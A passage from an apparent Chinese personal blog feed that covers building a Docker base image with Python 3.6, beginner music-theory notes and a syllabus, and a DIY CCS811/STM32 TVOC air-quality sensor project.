跑一遍。</li></ul></li><li>将容器打包成镜像<ul><li>运行一个容器</li><li>在容器中安装<code>python3.6</code>，哪一步超时了，重复哪一步的过程即可。</li><li>打包成镜像</li></ul></li></ul><p>无论使用哪种方式，我都强烈建议阅读文章的您，维护一个属于自己，具备自己程序所需环境的基础镜像，这样每次提交代码时，编写<code>Dockerfile</code>只需基于基础镜像，拷贝相关程序即可，非常节约时间。</p><h1 id="打包镜像的全过程（所有命令一行一行复制运行）"><a href="#打包镜像的全过程（所有命令一行一行复制运行）" class="headerlink" title="打包镜像的全过程（所有命令一行一行复制运行）"></a>打包镜像的全过程（所有命令一行一行复制运行）</h1><p>本文以安装<code>python3.6</code>为例，讲述将容器打包成镜像的过程。在安装<code>python3.6</code>有两种思路：</p><ul><li>源码编译安装的方式</li><li>通过<code>PPA</code>(Personal Package Archive)的apt工具包安装</li></ul><p>我们打包、制作基础镜像的原则，是要保证镜像体积尽可能少，因为docker是分层的结构，基础镜像大了，即使<code>Dockerfile</code>中删除了一些包，最终镜像的体积也不会减小。在我实际测试的过程中，编译安装<code>python3.6</code>打包后的镜像体积会比通过<code>PPA</code>的apt工具包安装大三分之一左右，有可能是编译所需的环境没有卸载干净，但是也不重要了。 </p><h2 id="镜像制作过程"><a href="#镜像制作过程" class="headerlink" title="镜像制作过程"></a>镜像制作过程</h2><p><strong>有条件的，请全程使用代理或者使用国外的<code>VPS</code>。<code>docker</code>官方<code>ubuntu:16.04</code>镜像经过专门的精简，其源国内访问有问题，替换源会导致一系列问题</strong></p><ol><li><p>在<strong>宿主机</strong>上运行一个容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it ubuntu:16.04<br></code></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>在<strong>容器内</strong>更新源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>安装<code>PPA</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install software-properties-common<br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>安装<code>python3.6</code>并验证安装结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-apt-repository ppa:jonathonf/python-3.6<br>apt-get update<br>apt-get install python3.6<br>python3.6 -V<br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>卸载<code>PPA</code>，缩小镜像体积：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> <span class="hljs-builtin-name">remove</span> --purge software-properties-common<br>apt-<span class="hljs-builtin-name">get</span> autoremove<br>apt-<span class="hljs-builtin-name">get</span> autoclean<br>dpkg -l |grep ^rc|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> |xargs dpkg -P<br></code></pre></td></tr></table></figure></li><li><p>退出容器，<strong>在容器内</strong>输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机</strong>上提交镜像至本地仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker commit -m=<span class="hljs-string">&quot;ubuntu:16.04 with python3.6 env&quot;</span> 131123f077e9 myubuntu:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><blockquote><p>这里需要注意，<code>131123f077e9</code> 为刚才退出容器的ID，可以通过<code>docker ps -a</code>查看。</p></blockquote></li><li><p>在<strong>宿主机</strong>上查看提交到本地仓库的镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker images |grep myubuntu<br></code></pre></td></tr></table></figure></li></ol><h1 id="番外篇：给使用PPA安装python的镜像安装第三方库"><a href="#番外篇：给使用PPA安装python的镜像安装第三方库" class="headerlink" title="番外篇：给使用PPA安装python的镜像安装第三方库"></a>番外篇：给使用PPA安装python的镜像安装第三方库</h1><p>由于通过<code>PPA</code>(Personal Package Archive)的apt工具包安装python环境的缘故，导致上述基础镜像并没有安装pip工具，这也是一个大坑，所以安装第三方库时，有两种思路。</p><ul><li>通过<code>pip</code>安装<ul><li>操作方便，但镜像体积略大</li></ul></li><li>通过<code>setuptools</code>安装<ul><li>安装时依赖问题麻烦，能缩小10 MB左右的镜像体积</li></ul></li></ul><p>所以，希望方便还是希望缩小10 MB左右的镜像体积，可以自行考虑。</p><h2 id="通过pip安装"><a href="#通过pip安装" class="headerlink" title="通过pip安装"></a>通过pip安装</h2><p>这种思路，是在宿主机上下载好<code>pip</code>的安装脚本拷贝进容器，安装好<code>pip</code>工具后，借助<code>pip</code>安装第三方库。</p><ol><li><p>在<strong>宿主机上</strong>，启动一个容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name silly_burnell -d myubuntu:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，下载安装脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py<br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，拷贝安装脚本到容器(<code>silly_burnell</code>是容器名)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker cp get-pip.py silly_burnell:/tmp<br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>输入命令，进入容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker start silly_burnell<br>docker attach silly_burnell<br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>，安装<code>pip</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br>python3.6 get-pip.py<br>rm get-pip.py<br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>，安装第三方库(以requests为例)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3.6 install requests<br></code></pre></td></tr></table></figure></li><li><p><strong>在容器内</strong>输入命令，退出容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机</strong>上，提交镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker commit -m <span class="hljs-string">&quot;ubuntu:16.04 with requests env&quot;</span> silly_burnell myubuntu:installed_requests<br>docker rm silly_burnell<br></code></pre></td></tr></table></figure></li></ol><h2 id="通过setuptools安装"><a href="#通过setuptools安装" class="headerlink" title="通过setuptools安装"></a>通过setuptools安装</h2><p>通常，我们找到的第三方库，在<code>github</code>上都有源码， 其支持通过<code>setuptools</code>来安装第三方库，这种方法的好处在于，可以减少镜像的体积（实测缩小10 Mb左右吧），毕竟不需要安装pip了，但缺点是，有的库有依赖，一个一个找依赖的库也确实挺麻烦的。</p><ol><li><p>在<strong>宿主机上</strong>，启动一个容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --name silly_burnell -d myubuntu:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，下载<code>setuptools</code>及第三方库的源码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/pypa/</span>setuptools.git<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/certifi/</span>python-certifi.git<br>git clone git:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/kennethreitz/</span>requests.git<br><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，拷贝源码到容器(<code>silly_burnell</code>是容器名)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker cp setuptools silly_burnell:/tmp<br>docker cp python-certifi silly_burnell:/tmp<br>docker cp requests silly_burnell:/tmp<br><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，输入命令进入容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker start silly_burnell<br>docker attach silly_burnell<br><br></code></pre></td></tr></table></figure></li><li><p>在<strong>容器内</strong>，安装<code>setuptool</code>和第三方库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp/setuptools<br>python3.6 bootstrap.py<br>python3.6 setup.py build<br>python3.6 setup.py install<br><span class="hljs-built_in">cd</span> /tmp/certifi<br>python3.6 setup.py build<br>python3.6 setup.py install<br><span class="hljs-built_in">cd</span> /tmp/requests<br>python3.6 setup.py build<br>python3.6 setup.py install<br>rm /tmp/* -rf<br></code></pre></td></tr></table></figure></li><li><p><strong>在容器内</strong>，输入命令，退出容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure></li><li><p>在<strong>宿主机上</strong>，退出容器，提交镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker commit <span class="hljs-string">&quot;ubuntu:16.04 with requests env&quot;</span> silly_burnell myubuntu:installed_requests<br>docker rm silly_burnell<br></code></pre></td></tr></table></figure></li></ol><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p><code>docker</code>官方的<code>ubuntu</code>镜像真的精简到有些病态的状态了，除了能跑起来，常用的<code>curl</code>、<code>nc</code>等等命令什么都没有，这种情况下，直接编写<code>Dockerfile</code>绝对是踩坑不断的。所以，自己跑一个容器，把环境安装好，重新打包成一个镜像备用，不失为一种良好的习惯。</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（三）——乐音体系，音列，音级</title>
    <link href="/posts/8ad7360b.html"/>
    <url>/posts/8ad7360b.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文记录了三个概念，乐音体系、音列、音级。</p><h1 id="乐音体系"><a href="#乐音体系" class="headerlink" title="乐音体系"></a>乐音体系</h1><p>在音乐中使用的、基本的乐音（有固定音高的音）的总和，叫做<strong>乐音体系</strong>。以钢琴键盘为例，每一个琴键对应的音，音高是固定的，那么从最低音到最高音，组成的总和就叫做乐音体系。</p><h1 id="音列"><a href="#音列" class="headerlink" title="音列"></a>音列</h1><p>乐音体系中的音，按照<strong>上行</strong>或者<strong>下行</strong>次序排列起来，叫做音列。这里需要注意，一<strong>定是按照上行或下行顺序的</strong>，如果震荡形式的，就不是音列。</p><h1 id="音级-重要"><a href="#音级-重要" class="headerlink" title="音级-重要"></a>音级-重要</h1><p>乐音体系中的每一个音叫做音级，就是一些<strong>固定频率的音</strong>。乐音体系中的各个音级都有各自的名称，这些名称在各个国家的表示不尽相同，被广泛采用的是C、D、E、F、G、A、B，这就是<strong>音名</strong>，他们在钢琴上的位置如下：</p><img src="https://pic.gaficat.com/maker/基本音级.png" alt="基本音级的示例" style="zoom:50%;" /><h2 id="音级的分类"><a href="#音级的分类" class="headerlink" title="音级的分类"></a>音级的分类</h2><ul><li>基本音级<ul><li>乐音体系中，七个具有独立名称的音级叫做基本音级。</li></ul></li><li>变化音级<ul><li>升高或降低基本音级而得来的音叫做变化音级</li></ul></li></ul><h3 id="基本音级"><a href="#基本音级" class="headerlink" title="基本音级"></a>基本音级</h3><p>以音名C、D、E、F、G、A、B七个字母命名的音级叫基本音级，基本音级在中世纪已经形成，当时差不多是唯一的音级。</p><p>乐音体系中，虽然有80多个高低不同的音级，但音的名称基本上只有这7个。其他各音的名称都是在这七个音名的基础上变化而来的。</p><p>钢琴上的五十二个白键，在相应的位置上，循环重复使用这个七个音名。从某一个音向上或向下数到第8个音，两个音之间的距离叫做<strong>“八度”</strong>，使用相同的音名。准确的讲，这里的八度应该叫<strong>“纯八度”</strong>。音名相同的各音，在乐音体系中有相同的意义，只是高度不同而已。</p><p>被广泛采用的音名除了C、D、E、F、G、A、B以外，还有do、re、mi、fa、sol、la、si。这些音名因为多用于唱歌，所以又叫做<strong>“唱名”</strong>。</p><h3 id="变化音级"><a href="#变化音级" class="headerlink" title="变化音级"></a>变化音级</h3><p>以钢琴键盘为例，就是钢琴键盘上的黑键。以下图为例，红点所指的就是变化音级，可以是C升高半音叫升C，也可以是D降低半音叫降D。</p><blockquote><p>这里的半音在之后会做详细解释，这里不做过多的说明，能够区分基本音级和变化音级即可。</p></blockquote><img src="https://pic.gaficat.com/maker/截屏2019-11-27下午11.23.23.png" alt="变化音级" style="zoom:50%;" /><p>如果表示为升C，可以在左上角写一个“#”，表示为：</p><img src="https://pic.gaficat.com/maker/升C.png" alt="升C" style="zoom:50%;" /><p>如果表示为降D，可以在左上角写一个“D”，表示为：</p><img src="https://pic.gaficat.com/maker/降D.png" alt="降D" style="zoom:50%;" /><h3 id="番外——升降全音"><a href="#番外——升降全音" class="headerlink" title="番外——升降全音"></a>番外——升降全音</h3><p>升高一个全音可以用“X”表示，降低一个全音可以用“bb”表示，均写在左上角。</p><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>前期比较枯燥，都是一些基本概念，了解即可，不必太在意。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>甲醛熏得人头痛？我做了一个TVOC传感器</title>
    <link href="/posts/bb4e922e.html"/>
    <url>/posts/bb4e922e.html</url>
    
    <content type="html"><![CDATA[<h1 id="先来两张完成的图镇楼"><a href="#先来两张完成的图镇楼" class="headerlink" title="先来两张完成的图镇楼"></a>先来两张完成的图镇楼</h1><p>斜着来一张</p><p><img src="https://cdn.sspai.com/2019/08/21/6a0f6d2790cb7bfd617e67b6d947488d.jpeg" alt="斜照"></p><p>正面再来一张</p><p><img src="https://cdn.sspai.com/2019/08/21/501741da7c379a4b703bd5468dbb677f.jpeg" alt="正面照"></p><h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>我是一名面向google的码农，曾经想改变世界，后来发现为了生存，在城市里打拼，世界没改变，只博得一个租来的鸽子笼。后来有一天，被北方雾霾的恐惧支配之后，我买了一台空气净化器，虽说可以看得到PM2.5，但除了PM2.5，空气中其他的污染物什么情况，我并不清楚。什么某某品牌车主车内苯超标得病；某某租房平台，租给租客的房子甲醛超标，导致其得病的消息非常多。</p><p>想想，我也有家人，有的刚提新车，有的刚装修新房，有的公司搬刚装修的新址，大家知道空气中我们吸入的是一些什么东西吗？于是我在淘宝搜了一下TVOC传感器，结果如下：</p><p><img src="https://cdn.sspai.com/2019/08/21/b16b887ed41f3a88e65630f7917ffa66.png" alt="某宝TVOC传感器"></p><p>发现稍微好点的，大都300元左右左右，并且这种检测模式吧，我也不可能上班天天哪个这玩意儿按呀？我便有了一个念头。</p><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>我希望自己做一个检测仪出来，它能满足一下条件：</p><ul><li>能够直观反映空气中苯、甲醛等有害物质的含量，保证结果具备可参考的价值。</li><li>体积足够的小巧，不能说有多高的颜值，起码不像淘宝上搜到的，都是一大坨吧，摆放在桌上起码得不占地方吧。</li><li>即插即用。放办公桌，放家里，放车上，总之插上电，稍作等待，即可看到实时传感器芯片测得的读数。工作之余、开车休息之余瞟一眼，就知道当前空气的状况。</li><li>价格足够低，保证能把成本压缩在几十元的范围内。</li></ul><h1 id="为什么是TVOC"><a href="#为什么是TVOC" class="headerlink" title="为什么是TVOC"></a>为什么是TVOC</h1><p>维基百科： <strong><a href="https://zh.wikipedia.org/zh/%E6%8C%A5%E5%8F%91%E6%80%A7%E6%9C%89%E6%9C%BA%E7%89%A9">挥发性有机物</a>（英语：Volatile Organic Compounds，<a href="https://zh.wikipedia.org/wiki/%E9%A6%96%E5%AD%97%E6%AF%8D%E7%B8%AE%E7%95%A5%E5%AD%97">首字母缩略字</a>：VOCs），有时也用TVOC来表示( 英语：Total Volatile Organic Compound )。</strong></p><p>实际上，TVOC，就指的是空气中所有挥发性有机物的总量，那什么是挥发性有机物呢？常见的笨、甲醛等，都属于挥发性有机物。我不可能想起来苯，就去买个苯的检测仪，想起来甲醛，就去买个甲醛的检测仪，当然，不差钱另说。<strong>所以用TVOC检测仪，一次性检测一下空气中所有挥发性有机物的含量，也许是对于普通人而言，性价比最高，推断当前空气的质量的方式了。</strong>如果TVOC值过高，则说明空气确实有一定的问题，就需要找专业的检测机构做相关的检测了。那么TVOC的标准是多少呢？见下表：</p><p><img src="https://cdn.sspai.com/2019/08/21/6672cc6481ecc8facb866359926afe48.png" alt="各国TVOC标准"></p><p><strong>甲醛之类的有害物质怎么去除</strong></p><p>想到去甲醛，首先想到的肯定是活性炭，空气净化器。实际上不同于PM2.5，可以使用带HEPA滤网的空气净化器吸附。甲醛这类有害物质挥发性极强，非常可悲的是，活性炭以及带活性炭的空气净化器，确实可以<strong>吸附（是吸附、不是去除）</strong>空气中的甲醛，但吸附一段时间后，气温一高，活性炭中的甲醛又挥发出去了。</p><p>面对甲醛这类有害物质，个人建议，最好的方式就是开窗通风，养一些绿植吧，当然，不差钱可以考虑新风系统。对啦，经常监测室内的有害物质含量，以防生活在毒气室里。</p><h1 id="芯片选型"><a href="#芯片选型" class="headerlink" title="芯片选型"></a><strong>芯片选型</strong></h1><h2 id="传感器芯片"><a href="#传感器芯片" class="headerlink" title="传感器芯片"></a><strong>传感器芯片</strong></h2><p>由于限定了我想做的这款传感器的价格，总成本在100元之内，翻遍了淘宝，最终确定了一款芯片，<a href="https://ams.com/ccs811">ccs811</a>。这款芯片由<a href="https://ams.com/zh/about-ams">ams</a>公司出品，虽然不是崇洋媚外，但传感器这种东西还是需要积累的，这样一家老牌的传感器解决方案厂商的芯片，质量应该可是可靠的。</p><h2 id="主控芯片"><a href="#主控芯片" class="headerlink" title="主控芯片"></a><strong>主控芯片</strong></h2><p>这一点就没啥好说的，直接上STM32，F103用的最熟，C8T6用过，便宜，所以最终选择了STM32F103C8T6。</p><h1 id="成本"><a href="#成本" class="headerlink" title="成本"></a><strong>成本</strong></h1><p>因为电阻、电容之类的很难计算每个板子的成本，加上快递之类的，这里只是给出一个大致的价格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs table">分类 |价格(元) <br>CCS811 |50 <br>STM32F103C8T6 |8 <br>OLED显示屏 |13 <br>电阻、LED、电容、usb接口等 |10 <br>PCB打样 |6 <br>亚克力外壳 |2 <br>队友手焊贴片请奶茶（23333） |10 <br>总价 |99 <br></code></pre></td></tr></table></figure><h1 id="暂时发现的问题"><a href="#暂时发现的问题" class="headerlink" title="暂时发现的问题"></a><strong>暂时发现的问题</strong></h1><ol><li>这款传感器TVOC是测量出来的，但eCO2都是计算出来的，不会非常精准，结果仅供参考。另外，人一吹气，变动较大，变动大的时候，停止呼吸？</li><li>传感器未带风扇，由于空气有流通性，所以想快速检测的时候，张牙舞爪，致命shake一波？</li><li>MCU检测到传感器掉线或者异常，会重新初始化传感器，无大碍，但确实这款传感器不是很好用。</li><li>传感器需要预热，通常实际测试，10-20分钟左右（预热时间还是比较长），读数才会稳定。</li><li>没钱做SMT，队友手焊贴片，难受啊，马飞。</li></ol><h1 id="最后还想说两句"><a href="#最后还想说两句" class="headerlink" title="最后还想说两句"></a><strong>最后还想说两句</strong></h1><p>新车、新房、新家具，作为普通人的我们，很难要求环境改变改变一些什么，能做的也只能是了解我们身处的环境，然后尽可能避免受到更严重的伤害吧。笔者的父母说，以前不知道，夏天新装的房子，还让笔者关着门窗在家里午休，也不知道受了多少伤害。现在笔者长大了，起码不会再让自己的家人，吸着有害的空气，还浑然不知吧！</p><p>很庆幸自己大学的专业和结识的小伙伴，允许自己在有一些小想法之后去实现它。自己做的这款TVOC传感器，说复杂不复杂，说简单不简单，本着他好我也好的原则开源出来，但是很难一行一行说代码如何实现的（说不定日后开一个专栏，跟我一起面向搜索引擎做电子设计？），感兴趣的小伙伴可以尝试自己也做一个出来。</p><p>目前准备把主控芯片32换成ESP8366，可以用APP查看历史趋势，敬请期待吧。</p><p><strong>项目地址：<a href="https://github.com/scarleast/airQ-TVOC-sensor">https://github.com/scarleast/airQ-TVOC-sensor</a></strong></p>]]></content>
    
    
    <categories>
      
      <category>电子设计</category>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电子设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（二）——什么是音？</title>
    <link href="/posts/3c8b96ad.html"/>
    <url>/posts/3c8b96ad.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文记录了音的基本概念，<strong>音的四种性质</strong>和<strong>音的两种类型</strong>。</p><h1 id="什么是音"><a href="#什么是音" class="headerlink" title="什么是音"></a>什么是音</h1><p>今天算是正式开始学习乐理， 第一节课的内容是音，我觉得复习了一边初中的物理，但我真的感觉这玩意儿跟音乐有个屁关系啊？还是像冯冯说的，艺考生有可能会考。</p><p><strong>音具有四种性质</strong>：</p><ul><li>高低（音高）<ul><li>振源振动的频率决定了音的高低，频率越高，音越高。</li></ul></li><li>长短（音值）<ul><li>振源振动的时间决定了音的长短，振动时间越长，音越长。</li></ul></li><li>强弱（音强）<ul><li>振源振动的幅度决定了音的强弱，振幅越大，音越强。</li></ul></li><li>音色<ul><li>振源的结构决定了音的音色。</li></ul></li></ul><p><strong>音具有两种类型</strong>：</p><ul><li>乐音<ul><li>物体有规律地振动发出的声音</li></ul></li><li>噪音<ul><li>物体无规律地振动发出的声音</li></ul></li></ul><h1 id="尾巴"><a href="#尾巴" class="headerlink" title="尾巴"></a>尾巴</h1><p>这第一节课真的摸鱼，我问冯冯音的四种性质是是什么，结果冯冯一个文科生，也都知道，那你说我这课听的，这笔记做的，有个啥意义。算啦算啦，第一节课，理解万岁。</p>]]></content>
    
    
    <categories>
      
      <category>音乐</category>
      
      <category>乐理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>乐理</tag>
      
      <tag>音乐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加菲猫的乐理学习笔记（一）——乐理考试大纲</title>
    <link href="/posts/9455060a.html"/>
    <url>/posts/9455060a.html</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文记录了音乐学院、师范院校关于音乐相关专业乐理方面的考试大纲，无论是对于艺考生的高考还是对于音乐爱好者，整体了解的<strong>乐理体系结构、学习目标</strong>能有一个初步的认识。</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天是2019年11月25日星期一，我在今天开始了自己对于乐理的学习。为什么选择这一个课程呢？其实虽然说自己不懂乐理，但还是知道自己缺什么东西的。我简单看了一些乐理课的课程大纲，要么太简单、要么缺少内容。无意间刷到了这个课程<a href="https://study.163.com/course/introduction/1003365002.htm">从零到精通-高考乐理教程</a>，发现至少从课程大纲来看，内容是非常完整的，从浅入深<strong>涵盖了乐理方面我希望了解的所有知识点</strong>。</p><p>我一直在强调<strong>体系结构的了解</strong>，这让我想到了我伯父（我的伯父是一所知名中学的校长，也是一名数学老师，但我的数学真的学的很烂~因为伯父和我不在一个城市，所以很少找伯父补习功课）给我补习功课时说的一些话。学习的过程是一个爬树的过程，你站在树底下，然后直接就向上爬，你永远不会分不清这可茂密的大树，它的树干和树枝是如何分布的，你肯定爬的非常迷糊，因为总是在想我应该往哪个分叉爬？是不是这个分叉我爬的不太对，应该换个树杈爬？所以只有当你从上往下看，看这棵树的全貌，分清了这棵树主干和分支的关系是什么样的，再往上爬时，你才能够向上爬的轻松。因为那时你就知道这棵树，哪里的枝干有问题，要小心，哪里的枝干强健，爬上去就行了。从小上课，我知道老师家长告诉我要预习，但是我的预习就是读一遍课文或者看一遍明天要讲的几页书，仅此而已。最终学习的过程也是跟着老师，学习零散的知识点。你问我这门课讲了什么？我说我不知道。你问我一个知识点，我好像知道点什么，但是又不是全知道。你问我你知道自己哪里的知识不会吗？我会说，不知道！<strong>从来没有人告诉过我：“学习新东西的时候，不要一开始就一头扎到细节里面去。先对你学习内容的体系结构有一个清晰的认识，之后再去钻研细节。这样你才会知道你正在学习的内容，是当前体系结构中的哪一部分，你对这部分内容学得好不好，你整个知识体系中哪部分内容需要巩固，你才会学的明白。”</strong>可惜我明白的太晚了。</p><p>犊子扯完了，该看了一下课程的大纲了，课程大纲包含一些知识点、练习和作业<strong>一共90节课</strong>，每节课的时间有长有短，有的课<strong>10多分钟</strong>，有的课有<strong>100分钟</strong>。我计划一天学习一节课，可能有的课程比较费时间，需要更多的时间，所以立一个小flag，2020年3月，检查自己的学习状况。这个课程总体的课程大纲如下：</p><ul><li>前言-课程简介</li><li><a href="(https://www.gaficat.com/posts/9455060a.html)">乐理考试大纲</a></li><li>音、音高<ul><li><a href="https://www.gaficat.com/posts/3c8b96ad.html">音</a></li><li><a href="https://www.gaficat.com/posts/8ad7360b.html">乐音体系、音列、音级</a></li><li><a href="https://www.gaficat.com/posts/1e3479cf.html">音的分组</a></li><li>音域及音区</li><li>自然半音和自然全音 变化半音和变化全音</li><li>等音</li><li>课后作业一</li></ul></li><li>记谱法<ul><li>五线谱</li><li>音符 休止符</li><li>音符 休止符的写法</li><li>谱号</li><li>增长音值的补充记号</li><li>变音记号</li><li>省略记号</li><li>演奏法的记号</li><li>课后作业二</li></ul></li><li>节奏、节拍<ul><li>节奏 节拍型</li><li>重音 节拍 拍子 小节</li><li>节奏划分的特殊形式</li><li>切分音</li><li>音值组合法</li><li>交换拍子 交错拍子</li><li>课后作业三</li></ul></li><li>音程<ul><li>音程 旋律音程 和声音程</li><li>音程的级数 音数及识别方法</li><li>自然音程 变化音程 单音程 复音程</li><li>音程的转位</li><li>等音程</li><li>协和音程 不协和音程</li><li>课后作业四</li></ul></li><li>和弦<ul><li>和弦</li><li>三和弦</li><li>七和弦</li><li>原位和弦及转位和弦</li><li>构建 识别和弦的方法</li><li>等和弦</li><li>课后作业五</li></ul></li><li>调 大调式、小调式<ul><li>调式 音阶 调 调性</li><li>大调式</li><li>小调式</li><li>关系大小调</li><li>大 小调音级的特性</li><li>同主音大小调</li><li>作品中大小调的明确方法</li><li>调式中的音程及不协和音程的解决</li><li>调式中的和弦 属七和弦、导七和弦的解决</li><li>特种自然大小调</li><li>课后作业六</li></ul></li><li>以五声音阶为基础的各种调式<ul><li>五声调式</li><li>同宫系统调 同主音系统调</li><li>六声调式</li><li>七声调式</li><li>五声调式为基础的各类调式特点</li><li>课后作业七</li></ul></li><li>转调及交替调式<ul><li>转调的特点及意义</li><li>转调的类别</li><li>调的关系</li><li>交替调式</li><li>课后作业八</li></ul></li><li>调式变音及移调、译谱<ul><li>调式变音</li><li>调式半音阶</li><li>简谱记谱 译谱 移调</li><li>课后作业九</li></ul></li><li>音乐的速度与力度<ul><li>速度的标记及意义</li><li>力度的标记及意义</li><li>课后作业十</li></ul></li><li>装饰音<ul><li>倚音</li><li>波音</li><li>颤音</li><li>回音</li><li>课后作业十一</li></ul></li><li>旋律<ul><li>旋律及其发展的方法</li><li>律进行的方法 